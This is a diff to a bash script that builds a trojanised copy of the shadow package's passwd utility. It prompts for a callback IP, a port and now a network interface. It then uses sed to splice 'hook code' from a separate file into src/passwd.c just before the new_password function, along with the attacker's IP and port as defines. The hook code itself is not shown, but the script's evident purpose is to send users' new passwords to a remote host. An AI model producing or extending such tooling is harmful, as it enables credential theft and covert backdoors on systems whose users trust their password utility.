@@ -11,7 +11,9 @@ echo -n "Enter the IP Address to Callback to : "
 read ip
 echo -n "Set the destination port : "
 read port
-echo -ne "IP : ${ip}\n Port : ${port}\n Confirm these settings [y/n] : "
+echo -n "Enter Interface name : "
+read interface
+echo -ne "IP : ${ip}\n Port : ${port}\n Interface : ${interface}\nConfirm these settings [y/n] : "
 read pass
 if [[ $pass == n ]]; then
     exit 0
@@ -31,10 +33,10 @@ cd shadow
 
 cd ../
 # Assign Code to Paste
-imports=$(head -n 4 hook_code.txt)
+imports=$(head -n 7 hook_code.txt)
 def_var="#define IP \"${ip}\""
 def_port="#define PORT ${port}"
-code=$(tail -n +10 hook_code.txt)
+code=$(tail -n +13 hook_code.txt)
 
 # Fix Newline Char
 imports=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$imports")
@@ -52,6 +54,7 @@ sed -i '/#include \"shadowio.h\"/a '"$imports"'' src/passwd.c
 
 # Add Variables
 sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
+sed -i 's/#INT/'"$interface"'/g' src/passwd.c
 
 # Add Hook Function
 sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
